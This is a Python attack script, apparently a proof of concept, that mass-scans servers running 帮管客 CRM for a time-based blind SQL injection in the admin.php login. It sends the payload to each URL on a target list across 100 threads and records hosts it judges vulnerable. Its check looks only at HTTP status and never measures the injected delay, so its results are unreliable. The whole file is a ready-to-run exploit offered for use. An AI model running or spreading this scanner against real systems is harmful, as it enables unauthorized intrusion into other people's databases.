import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="帮管客crm-sql-注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload='/admin.php?controller=admin_commonuser'
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
		'Connection':'close',
		'Content-Length':'78',
		'Accept':'*/*',
		'Content-Type':'application/x-www-form-urlencoded',
		'Accept-Encoding':'gzip'
    }
    data="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }
    try:  
        # 尝试发送 POST 请求，并设置超时  
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)  
        if res1.status_code == 200:  
            with open('result.txt', 'a', encoding='utf-8') as fp:  
                fp.write(f'[+]{target} 存在注入漏洞\n') 
                print(f"[+]{target}存在sql注入漏洞") 
        else:  
            print(f"[-]对 {target} 不存在注入漏洞: {res1.status_code}")  
    
    except requests.exceptions.RequestException as e:  
        print(f"请求 {target} 失败: {e}") 

if __name__ == '__main__':
    main()
